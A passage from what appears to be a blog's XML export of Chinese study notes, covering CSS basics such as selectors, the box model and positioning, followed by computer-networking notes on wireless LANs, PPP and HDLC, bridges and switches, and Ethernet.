css层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言</p></blockquote><p>DIV是html的一个标签，css是一个样式表</p><h2 id="样式表分为："><a href="#样式表分为：" class="headerlink" title="样式表分为："></a>样式表分为：</h2><ul><li>嵌入样式表</li><li>外部样式</li><li>内联样式</li></ul><h2 id="样式选择器："><a href="#样式选择器：" class="headerlink" title="样式选择器："></a>样式选择器：</h2><ul><li>元素选择器  div{属性:值}</li><li>ID选择器  #id{属性:值}</li><li>class选择器  .类名{属性:值}</li><li>…</li></ul><h2 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h2><ul><li>background-color     规定要使用的背景颜色。 </li><li>background-position     规定背景图像的位置。     </li><li>background-size     规定背景图片的尺寸。     </li><li>background-repeat     规定如何重复背景图像。     </li><li>background-origin     规定背景图片的定位区域。     </li><li>background-clip     规定背景的绘制区域。</li><li>…</li></ul><h2 id="边框："><a href="#边框：" class="headerlink" title="边框："></a>边框：</h2><ul><li> border-color:#000 边框颜色</li><li>border-width:1px; 边框宽度 </li><li>border-left 设置左边框，一般单独设置左边框样式使用</li><li>border-right 设置右边框，一般单独设置右边框样式使用</li><li>border-top 设置上边框，一般单独设置上边框样式使用</li><li>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为css下划线效果应用。</li></ul><h2 id="文字属性："><a href="#文字属性：" class="headerlink" title="文字属性："></a>文字属性：</h2><ul><li>color:red; 文字颜色 #ffeeees</li><li>font-size:12px; 文字大小</li><li>font-weight:bolds 文字粗细(bold/normal)</li><li>font-family:”宋体”文字字体</li><li>font-variant:small-caps小写字母以大写字母显示</li></ul><h2 id="文本属性：-1"><a href="#文本属性：-1" class="headerlink" title="文本属性："></a>文本属性：</h2><ul><li>text-align:center; 文本对齐(right/left/center)</li><li>line-height:10px; 行间距(可通过它实现文本的垂直居中)</li><li>text-indent:20px; 首行缩进</li><li>text-decoration:none;</li><li>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</li><li>letter-spacing: 字间距</li></ul><h2 id="列表："><a href="#列表：" class="headerlink" title="列表："></a>列表：</h2><ul><li>list-style-type     设置列表项标记的类型。</li><li>list-style-position     设置在何处放置列表项标记。</li><li>list-style-image     使用图像来替换列表项的标记。</li></ul><h2 id="超链接："><a href="#超链接：" class="headerlink" title="超链接："></a>超链接：</h2><ul><li>a{text-decoration: none;}//去掉a标签下划线</li><li>a:link {color:#FF0000;} /* 未访问的链接 */</li><li>a:visited {color:#00FF00;} /* 已访问的链接 */</li><li>a:hover {color:#FF00FF;} /* 鼠标划过链接 */</li><li>a:active {color:#0000FF;} /* 已选中的链接 */</li></ul><h2 id="盒子模型："><a href="#盒子模型：" class="headerlink" title="盒子模型："></a>盒子模型：</h2><blockquote><p>外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性。</p><p>自身的身高 width height ，内边距 padding，盒子边框 border，与其他盒子的距离 margin 外边距</p></blockquote><h2 id="border边框："><a href="#border边框：" class="headerlink" title="border边框："></a>border边框：</h2><p>简写:border:1px solid #foo;</p><h2 id="margin和padding："><a href="#margin和padding：" class="headerlink" title="margin和padding："></a>margin和padding：</h2><ul><li>值：px  像素/厘米等长度单位、百分比</li><li>单独属性margin/padding-top/left/right/bottom</li></ul><h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><p>脱离文档流浮动</p><ul><li>left  元素向左浮动。</li><li>right 元素向右浮动</li><li>clear: both; 清除浮动</li></ul><p><img src="/2021/07/05/60-zhi-day1/image-20210706112508157.png" alt="image-20210706112508157"></p><p><img src="/2021/07/05/60-zhi-day1/image-20210706112519903.png" alt="image-20210706112519903"></p><h2 id="块级元素、行内元素"><a href="#块级元素、行内元素" class="headerlink" title="块级元素、行内元素"></a>块级元素、行内元素</h2><blockquote><p>块级元素</p><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置width、height属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置margin、padding属性；</p></blockquote><blockquote><p>行内元素</p><p>不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的width、height属性则无效；</p><p>行内元素的margin、padding属性很奇怪，水平方向的padding-left、padding-rigtht、margin-left、padding-right都会产生边距效果，但是竖直方向的padding-top、padding-bottom、margin-top、margin-bottom却不产生边距效果。</p></blockquote><h3 id="块级元素和行内元素的转换"><a href="#块级元素和行内元素的转换" class="headerlink" title="块级元素和行内元素的转换"></a>块级元素和行内元素的转换</h3><ul><li>display:none; 不显示</li><li>display:block;变成块级元素</li><li>display:inline; 变成行内元素</li><li>display:inline-block;以块级元素样式展示，以行级元素样式排列</li></ul><h3 id="块级元素："><a href="#块级元素：" class="headerlink" title="块级元素："></a>块级元素：</h3><ul><li>address 地址</li><li>center 举中对齐块</li><li>div- 常用块级容易</li><li>dl 定义列表</li><li>form 交互表单 （只能用来容纳其它块元素）</li><li>h标签</li><li>hr 水平分隔线</li><li>ol 无需列表</li><li>ul有序列表</li><li>p 段落</li><li>pre 格式化文本</li></ul><h3 id="行内元素："><a href="#行内元素：" class="headerlink" title="行内元素："></a>行内元素：</h3><ul><li>a - 锚点</li><li>b - 粗体(不推荐)</li><li>br- 换行</li><li>code - 计算机代码(在引用源码的时候需要)</li><li>em - 强调</li><li>i - 斜体</li><li>img - 图片（特殊的内联元素，同时是内联替换元素，替换元素可以设置宽高）当图片和DIV在一起时，图片周围会出现margin现象，即元素不重合贴在一起，为了解决这个问题，设置img的css为{margin：0；display：block；border：0px}</li><li>input - 输入框</li><li>label - 表格标签</li><li>select - 项目选择</li><li>strong - 粗体强调</li><li>textarea - 多行文本输入框</li><li>u - 下划线</li><li>var - 定义变量</li></ul><p>替换元素：(和img一样的设置方法，没有实际内容)</p><p>img&gt;、input&gt;、textarea&gt;、select&gt;、object&gt;</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><ul><li>overflow 属性规定当内容溢出元素框时发生的事情。</li><li>visible    默认值。内容不会被修剪，会呈现在元素框之外。</li><li>hidden    内容会被修剪，并且其余内容是不可见的。</li><li>scroll    内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。</li><li>auto    如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。</li><li>inherit    规定应该从父元素继承 overflow 属性的值。</li></ul><h2 id="定位："><a href="#定位：" class="headerlink" title="定位："></a>定位：</h2><p>position</p><ul><li><p>static静态定位（不对它的位置进行改变，在哪里就在那里）</p><p>默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者z-index 声明）。</p></li><li><p>fixed固定定位（参照物–****浏览器窗口****）—做 弹窗广告用到。</p><p>生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 “left”, “top”, “right”以及 “bottom”属性进行规定。</p></li><li><p>relative（相对定位 ）（****参照物以他本身****）。</p><p>生成相对定位的元素，相对于其正常位置进行定位。</p></li><li><p>absolute（绝对定位）(除了static都可以，找到参照物–&gt;与它最近的已经有定位的****父元素****进行定位)</p><p>生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。</p><p>元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定</p></li></ul><p>z-index </p><p>z-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。</p><p>定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> divcss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-10(第三章)</title>
      <link href="/2021/05/14/ji-suan-ji-wang-luo-10/"/>
      <url>/2021/05/14/ji-suan-ji-wang-luo-10/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-10"><a href="#计算机网络-10" class="headerlink" title="计算机网络-10"></a>计算机网络-10</h1><span id="more"></span><h2 id="3-6-3-无线局域网"><a href="#3-6-3-无线局域网" class="headerlink" title="3.6.3 无线局域网"></a>3.6.3 无线局域网</h2><h3 id="IEEE-802-11"><a href="#IEEE-802-11" class="headerlink" title="IEEE 802.11"></a>IEEE 802.11</h3><p>IEEE 802.11是<strong>无线局域网</strong>通用的标准，它是由IEEE所定义的无线网络通信标准。</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210514162513767.png" alt="image-20210514162513767"></p><blockquote><p>WiiFi跟无线局域网是一样的吗？ </p><p>当然不是，无线局域网比WiFi所覆盖的范围大得多，无线局域网覆盖范围有几千米，WiFi可能只有一间屋子，WiFi是由IEEE 802.11b和IEEE 802.11g所定义的标准</p></blockquote><h3 id="802-11的MAC帧头格式"><a href="#802-11的MAC帧头格式" class="headerlink" title="802.11的MAC帧头格式"></a>802.11的MAC帧头格式</h3><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210515103715748.png" alt="image-20210515103715748"></p><h3 id="802-11-的MAC帧头格式"><a href="#802-11-的MAC帧头格式" class="headerlink" title="802.11 的MAC帧头格式"></a>802.11 的MAC帧头格式</h3><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516132030542.png" alt="image-20210516132030542"></p><h3 id="无线局域网的分类"><a href="#无线局域网的分类" class="headerlink" title="无线局域网的分类"></a>无线局域网的分类</h3><p>无线局域网分为：</p><ol><li><p>有固定基础设施无线局域网</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516133912677.png" alt="image-20210516133912677"></p></li><li><p>无固定基础设施无线局域网的自组织网络(了解)</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516134021424.png" alt="image-20210516134021424"></p></li></ol><h2 id="3-7-PPP协议和HDLC协议"><a href="#3-7-PPP协议和HDLC协议" class="headerlink" title="3.7 PPP协议和HDLC协议"></a>3.7 PPP协议和HDLC协议</h2><h3 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h3><p>PPP协议和HDLC协议通常应用于广域网。</p><p>广域网（WAN，Wide Area Network），通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个城市或国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。</p><p>广域网的通信子网主要使用<strong>分组交换</strong>技术。广域网的通信子网可以利用公用分组交换网、卫星通信网和无线分组交换网，它将分布在不同地区的<strong>局域网或计算机系统</strong>互连起来，达到<strong>资源共享</strong>的目的。如因特网（Internet）是世界范围内最大的广域网。</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516134703989.png" alt="image-20210516134703989"></p><h3 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h3><p>点对点协议PPP（Point-to-Point protoco）是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都使用PPP协议。</p><p><strong>只支持全双工链路。</strong></p><h4 id="PPP协议应满足的要求："><a href="#PPP协议应满足的要求：" class="headerlink" title="PPP协议应满足的要求："></a>PPP协议应满足的要求：</h4><ul><li><p>简单</p><p>对于链路层的帧，无需纠错，无需序号，无需流量控制。</p></li><li><p>封装成帧</p><p>帧定界符</p></li><li><p>透明传输</p><p>与帧定界符一样比特组合的数据应该如何处理：异步线路用字节填充，同步线路用比特填充。</p></li><li><p>多种网络层协议</p><p>封装的IP数据报可以采用多种协议。</p></li><li><p>多种类型链路</p><p>串行/并行，同步/异步，电/光…</p></li><li><p>差错检测</p><p>错就丢弃</p></li><li><p>检测连接状态</p><p>链路是否正常工作</p></li><li><p>最大传输单元</p><p>数据部分最大长度MTU</p></li><li><p>网络层地址协商</p><p>知道通信双方的网络层地址</p></li><li><p>数据压缩协商</p><p>需要在发送数据时对数据进行压缩</p></li></ul><h4 id="PPP协议无需满足的要求："><a href="#PPP协议无需满足的要求：" class="headerlink" title="PPP协议无需满足的要求："></a>PPP协议无需满足的要求：</h4><ul><li>纠错</li><li>流量控制</li><li>序号</li><li>不支持多点线路</li></ul><h4 id="PPP协议的三个组成部分-PPP协议需要实现的三个功能："><a href="#PPP协议的三个组成部分-PPP协议需要实现的三个功能：" class="headerlink" title="PPP协议的三个组成部分/PPP协议需要实现的三个功能："></a>PPP协议的三个组成部分/PPP协议需要实现的三个功能：</h4><ol><li>一个将IP数据包封装到串行链路(同步串行/异步串行)的方法。</li><li>链路控制协议LCP：建立并维护数据链路连接。   <strong>身份验证</strong></li><li>网络控制协议NCP：PPP可支持多种网络层协议，每个不同的网络层协议都要一个相应的NCP来配置，<strong>为网络层协议建立和配置逻辑连接</strong>。</li></ol><h4 id="PPP协议状态图："><a href="#PPP协议状态图：" class="headerlink" title="PPP协议状态图："></a>PPP协议状态图：</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516140525982.png" alt="image-20210516140525982"></h4><h4 id="PPP协议帧格式："><a href="#PPP协议帧格式：" class="headerlink" title="PPP协议帧格式："></a>PPP协议帧格式：</h4><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516140729187.png" alt="image-20210516140729187"></p><p>PPP协议是面向字节的一种协议</p><h3 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h3><p>高级数据链路控制（High-Level Data Link Control或简称HDLC），是一个在同步网上传输数据、<strong>面向比特</strong>的数据链路层协议，它是由国际标准化组织（ISO）根据IBM公司的 SDLC(Synchronous Data Link Control)协议扩展开发而成的，数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现。</p><p><strong>采用全双工通信。</strong></p><p>所有帧釆用<strong>CRC检验</strong>，对信息帧进行顺序<strong>编号</strong>，可防止漏收或重份，传输可靠性高。</p><h4 id="HDLC的站"><a href="#HDLC的站" class="headerlink" title="HDLC的站"></a>HDLC的站</h4><p>主站、从站、复合站：</p><ol><li>主站的主要功能是发送命令（包括数据信息）帧、接收响应帧，并负责对整个链路的控制系统的初启、流程的控制、差错检测或恢复等。</li><li>从站的主要功能是接收由主站发来的命令帧，向主站发送响应帧，并且配合主站参与差错恢复等链路控制。</li><li>复合站的主要功能是既能发送，又能接收命令帧和响应帧，并且负责整个链路的控制。</li></ol><p>三种数据操作的方式：</p><ol><li>正常响应方式</li><li>异步平衡方式</li><li>异步响应方式</li></ol><h4 id="HDLC帧格式"><a href="#HDLC帧格式" class="headerlink" title="HDLC帧格式"></a>HDLC帧格式</h4><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516142419938.png" alt="image-20210516142419938"></p><p>HDLC帧类型：</p><ol><li>信息帧  (I)第1位为0，用来<strong>传输数据信息</strong>，或使用捎带技术对数据进行确认；</li><li>监督帧  (S) 10，用于<strong>流量控制和差错控制</strong>，执行对信息帧的确认、请求重发和请求暂停发送等功能</li><li>无编号帧  (U) 11，用于提供对<strong>链路</strong>的建立、拆除等多种控制功能。</li></ol><h3 id="PPP协议和HDLC协议异同"><a href="#PPP协议和HDLC协议异同" class="headerlink" title="PPP协议和HDLC协议异同"></a>PPP协议和HDLC协议异同</h3><p>相同点：</p><ul><li>HDLC、PPP只支持全双工链路。</li><li>都可以实现透明传输。</li><li>都可以实现差错检测，但不纠正差错。</li></ul><p>不同点：</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516143022937.png" alt="image-20210516143022937"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516143117244.png" alt="image-20210516143117244"></p><h2 id="3-8-链路层设备"><a href="#3-8-链路层设备" class="headerlink" title="3.8 链路层设备"></a>3.8 链路层设备</h2><h3 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h3><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516144743749.png" alt="image-20210516144743749"></p><p>容易发生冲突，传输效率低</p><h3 id="链路层扩展以太网"><a href="#链路层扩展以太网" class="headerlink" title="链路层扩展以太网"></a>链路层扩展以太网</h3><h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p>网桥根据<strong>MAC帧的目的地址</strong>对帧进行<strong>转发</strong>和<strong>过滤</strong>。当网桥收到一个帧时，并不向所有接口转发此帧，而是先检査此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把它丢弃（即过滤）。</p><p>而集线器它是向每个接口转发此帧。</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516145720426.png" alt="image-20210516145720426"></p><p>网桥优点：</p><ol><li>过滤通信量，增大吞吐量。</li><li>扩大了物理范围</li><li>提高了可靠性</li><li>可恶联不通物理层、不同MAC子层和不同速率的以太网。</li></ol><h5 id="网桥–透明网桥"><a href="#网桥–透明网桥" class="headerlink" title="网桥–透明网桥"></a>网桥–透明网桥</h5><p><strong>透明网桥</strong>：“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备一一自学习。</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516150601530.png" alt="image-20210516150601530"></p><p>转发表会在几分钟更新一次，然后再一次通过自学习填满它</p><h5 id="网桥–源路由网桥"><a href="#网桥–源路由网桥" class="headerlink" title="网桥–源路由网桥"></a>网桥–源路由网桥</h5><p>源路由网桥：在发送帧时，把详细的最佳路由信息（路由最少/时间最短）放在帧的首部中。</p><p>方法：源站以广播方式向欲通信的目的站发送一个<strong>发现帧</strong>。</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516151128737.png" alt="image-20210516151128737"></p><h4 id="多接口网桥–以太网交换机"><a href="#多接口网桥–以太网交换机" class="headerlink" title="多接口网桥–以太网交换机"></a>多接口网桥–以太网交换机</h4><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516151434994.png" alt="image-20210516151434994"></p><h5 id="以太网交换机的俩种交换方式"><a href="#以太网交换机的俩种交换方式" class="headerlink" title="以太网交换机的俩种交换方式"></a>以太网交换机的俩种交换方式</h5><ul><li><p><strong>直通式交换机</strong>：</p><p>查完目的地址（6B）就立刻转发。<br><strong>延迟小</strong>，可靠性低，无法支持具有不同速率的端口的交换。</p></li><li><p><strong>存储转发式交换机</strong>：</p><p>将帧放入高速缓存，并检査否正确，正确则转发，错误则丢弃。</p><p>延迟大，<strong>可靠性高，可以支持具有不同速率的端口的交换</strong>。</p></li></ul><h3 id="冲突域和广播域"><a href="#冲突域和广播域" class="headerlink" title="冲突域和广播域"></a>冲突域和广播域</h3><p><strong>冲突域</strong>：在同一个冲突域中的每一个节点都能收到所有被发送的帧。简单的说就是同一时间内只能有一台设备发送信息的范围。</p><p><strong>广播域</strong>：网络中能接收任一设备发出的广播帧的所有设备的集合。简单的说如果站点发出个广播信号，所有能接收收到这个信号的设备范围称为一个广播域</p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516152116441.png" alt="image-20210516152116441"></p><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516152255776.png" alt="image-20210516152255776"></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516152316784.png" alt="image-20210516152316784"></p><h2 id="第三章总结"><a href="#第三章总结" class="headerlink" title="第三章总结"></a>第三章总结</h2><p><img src="/2021/05/14/ji-suan-ji-wang-luo-10/image-20210516152922647.png" alt="image-20210516152922647"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-9(第三章)</title>
      <link href="/2021/05/12/ji-suan-ji-wang-luo-9/"/>
      <url>/2021/05/12/ji-suan-ji-wang-luo-9/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-9"><a href="#计算机网络-9" class="headerlink" title="计算机网络-9"></a>计算机网络-9</h1><p>从此节开始学习一系列的科普性知识，只需关注重点内容。</p><span id="more"></span><h2 id="3-6-1-局域网基本概念和体系结构"><a href="#3-6-1-局域网基本概念和体系结构" class="headerlink" title="3.6.1 局域网基本概念和体系结构"></a>3.6.1 局域网基本概念和体系结构</h2><h3 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h3><p>局域网（Local Area Network）：简称<strong>LAN</strong>，是指在<strong>某一区域内</strong>由多台计算机互联成的计算机组，使用<strong>广播信道</strong>。</p><ul><li>特点1：覆盖的地理范围较小，只在一个相对独立的局部范围内联，如一座或集中的建筑群内。</li><li>特点2：使用专门铺设的传输介质（双绞线、同轴电缆）进行联网，数据传输速率高（10Mb/s~10Gb/s）。</li><li>特点3：通信延迟时间短，误码率低，可靠性较高。</li><li>特点4：各站为平等关系，共享传输信道。</li><li>特点5：多采用分布式控制和广播式通信，能进行广播和组播。</li></ul><p>决定局域网的主要要素为：<strong>网络拓扑，传输介质</strong>与<strong>介质访问控制方法</strong>。</p><h3 id="局域网网络拓扑"><a href="#局域网网络拓扑" class="headerlink" title="局域网网络拓扑"></a>局域网网络拓扑</h3><h4 id="星型拓扑"><a href="#星型拓扑" class="headerlink" title="星型拓扑"></a>星型拓扑</h4><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513174205790.png" alt="image-20210513174205790"></p><p>中心节点是控制中心，任意两个节点间的通信最多只需<strong>两步</strong>，传输速度快，并且网络构形简单、建网容易、便于控制和管理。但这种网络系统，网络可靠性低，网络共享能力差，有单点故障问题。</p><h4 id="总线型拓扑-比较好"><a href="#总线型拓扑-比较好" class="headerlink" title="总线型拓扑(比较好)"></a>总线型拓扑(比较好)</h4><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513174429074.png" alt="image-20210513174429074"></p><p>网络可靠性高、网络节点间响应速度快、共享资源能力强、设备投入量少成本低、安装使用方便，当某个工作站节点出现故障时，对整个网络系统影响小。</p><h4 id="环形拓扑"><a href="#环形拓扑" class="headerlink" title="环形拓扑"></a>环形拓扑</h4><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513174437983.png" alt="image-20210513174437983"></p><p>系统中通信设备和线路比较节省。有<strong>单点故障</strong>问题；由于环路是封闭的，所以不便于扩充，系统响应延时长，且信息传输效率相对较低。</p><h4 id="树形拓扑"><a href="#树形拓扑" class="headerlink" title="树形拓扑"></a>树形拓扑</h4><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513174445279.png" alt="image-20210513174445279"></p><p>易于拓展，易于隔离故障也容易有<strong>单点故障</strong>。</p><h3 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h3><p>局域网分为：</p><ul><li><p>有线局域网</p><p>常用介质：双绞线、同轴电缆、光纤</p></li><li><p>无线局域网</p><p>常用介质：电磁波</p></li></ul><h3 id="局域网介质访问控制"><a href="#局域网介质访问控制" class="headerlink" title="局域网介质访问控制"></a>局域网介质访问控制</h3><ol><li> CSMA/CD</li></ol><p>   常用于<strong>总线型局域网</strong>，也用于树型网络</p><ol start="2"><li><p>令牌总线</p><p>常用于<strong>总线型局域网</strong>，也用于树型网络</p><p>它是把总线型或树型网络中的各个工作站按一定顺序如按接口地址大小排列形成个逻辑环。只有令牌持有者才能控制总线，才有发送信息的权力</p></li><li><p>令牌环</p><p>用于<strong>环形局域网</strong>，如令牌环网</p></li></ol><p>物理拓扑和逻辑拓扑不一定一样，物理拓扑受现实制约，逻辑拓扑受通信思想制约。</p><h3 id="局域网分类"><a href="#局域网分类" class="headerlink" title="局域网分类"></a>局域网分类</h3><ol><li><p>以大网</p><p>以太网是应用最为广泛的局域网，包括标准以太网（10Mbps）、快速以太网（100Mbps）、千兆以太网（100Mbps）和10G以太网，它们都符合IEEE802.3系列标准规范。逻辑拓扑总线型，物理拓扑是星型或拓展星型。使用 CSMA/CD。</p></li><li><p>令牌环网</p><p>物理上釆用了星形拓扑结构，逻辑上是环形拓扑结构。已是“明日黄花”。</p></li><li><p>FDDI网（Fiber Distributed Data Interface）</p><p>物理上釆用了双环拓扑结构，逻辑上是环形拓扑结构。</p></li><li><p>ATM网（Asynchronous Tramsfer Mode）</p><p>较新型的单元交换技术使用53字节固定长度的单元进行交换。</p></li><li><p>无线局域网（Wirelless Local Area network；WLAN）</p><p>采用IEE802.11标准。</p></li></ol><h3 id="IEE-802标准"><a href="#IEE-802标准" class="headerlink" title="IEE 802标准"></a>IEE 802标准</h3><p>IEEE802系列标准是IEE802 LAN/MAN标准委员会制定的局域网、城域网技术标准（1980年2月成立）。其中最广泛使用的有以太网、令牌环、无线局域网等。这一系列标准中的每一个子标准都由委员会中的一个专门工作组负责。</p><p>需要记忆的为：</p><ul><li>IEEE802.3：以太网介质访问控制协议（CSMA/CD）及物理层技术规范。</li><li>IEEE802.5：令牌环网（Token-Ring）的介质访问控制协议及物理层技术规范。</li><li>IEEE802.8：光纤技术咨询组，提供有关光纤联网的技术咨询</li><li>lEEE802.11：无线局域网（WLAN）的介质访问控制协议及物理层技术规范。</li></ul><h3 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h3><p>IEEE 802标准所描述的局域网参考模型只对应OSI参考模型的<strong>数据链路层和物理层</strong>，它将数据链路层划分为逻辑链路层LLC子层和介质访问控制MAC子层。</p><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513191704053.png" alt="image-20210513191704053"></p><p>LLC子层：</p><p>LLC负责识别网络层协议，然后对它们进行封装。LLC报头告诉数据链路层一旦帧被接收到时，应当对数据包做何处理。为网络层提供服务：无确认无连接、面向连接、有确认无连接、高速传送。</p><p>MAC子层：</p><p>MAC子层的主要功能包括数据帧的封装/卸装，帧的寻址和识别，帧的接收与发送，链路的管理，帧的差错控制等。MAC子层的存在屏蔽了不同物理链路种类的差异性。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513192408873.png" alt="image-20210513192408873"></p><h2 id="3-6-2-以太网"><a href="#3-6-2-以太网" class="headerlink" title="3.6.2 以太网"></a>3.6.2 以太网</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>以太网（<strong>Ethernet</strong>）指的是由 Xerox公司创建并由 Xerox、Intel|和DEC公司联合开发的<strong>基带总线局域网规范</strong>，是当今现有局域网采用的最通用的通信协议标准。以太网络使用 <strong>CSMA/CD</strong>（载波监听多路访问及冲突检测）技术。</p><p>以太网在局域网各种技术中占统治性地位：</p><ul><li>造价低廉（以太网网卡不到100块）。</li><li>它是应用最广泛的局域网技术。</li><li>比令牌环网、ATM网便宜，简单。</li><li>满足网络速率要求：10Mb/s~10Gb/s。</li></ul><p>以太网的俩个标准</p><ul><li>DIX Ethernet V2：第一个局域网产品（以太网）规约。<br>IEEE802.3：IEEE802委员会802.3工作组制定的第一个IEEE的以太网标准。（帧格式有一丢丢改动）</li></ul><p>以太网也叫802.3局域网</p><h3 id="以太网提供无连接、不可靠的服务"><a href="#以太网提供无连接、不可靠的服务" class="headerlink" title="以太网提供无连接、不可靠的服务"></a>以太网提供无连接、不可靠的服务</h3><p>无连接：发送方和接收方之间无“握手过程</p><p>不可靠：不对发送方的数据帧<strong>编号</strong>，接收方不向发送方进行<strong>确认</strong>，差错帧直接丢弃，差错纠正由高层负责。</p><p><strong>以太网只实现无差错接收，不实现可靠传输。</strong>以太网主要负责数据链路层和物理层。</p><h3 id="以太网传输介质与拓扑结构发展"><a href="#以太网传输介质与拓扑结构发展" class="headerlink" title="以太网传输介质与拓扑结构发展"></a>以太网传输介质与拓扑结构发展</h3><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513193940857.png" alt="image-20210513193940857"></p><p>使用集线器的以太网在逻辑上仍是一个总线网，各站共享逻辑上的总线，使用的还是 CSMA/CD协议。</p><p>以太网拓扑：<strong>逻辑</strong>上<strong>总</strong>线型，<strong>物理</strong>上<strong>星</strong>型。</p><h3 id="10BASE-T以太网"><a href="#10BASE-T以太网" class="headerlink" title="10BASE-T以太网"></a>10BASE-T以太网</h3><p>BASE对应基带信号，T对应双绞线，10对应传输速率</p><p>10BASE-T是传送<strong>基带信号</strong>的双绞线以太网，T表示采用双绞线，现10 BASE-T采用的是<strong>无屏蔽双绞线</strong>（UTP），传输速率是<strong>10Mb/s</strong>。</p><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210513194330116.png" alt="image-20210513194330116"></p><p><strong>物理上采用星型拓扑，逻辑上总线型</strong>，每段双绞线最长<strong>100m</strong>。</p><p>采用<strong>曼彻斯特编码</strong>。</p><p>采用<strong>CSMA/CD</strong>介质访问控制。</p><blockquote><p>“集线器是指将多条以太网双绞线或光纤集合连接在同一段物理介质下的设备，其作用是：对接收到的信号进行再生整形放大，以扩大网络的传输距离，同时把所有节点集中在以它为中心的节点上。”</p></blockquote><h3 id="适配器和MAC地址"><a href="#适配器和MAC地址" class="headerlink" title="适配器和MAC地址"></a>适配器和MAC地址</h3><p>计算机与外界有线局域网的连接是通过<strong>通信适配器</strong>的。</p><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210514155204831.png" 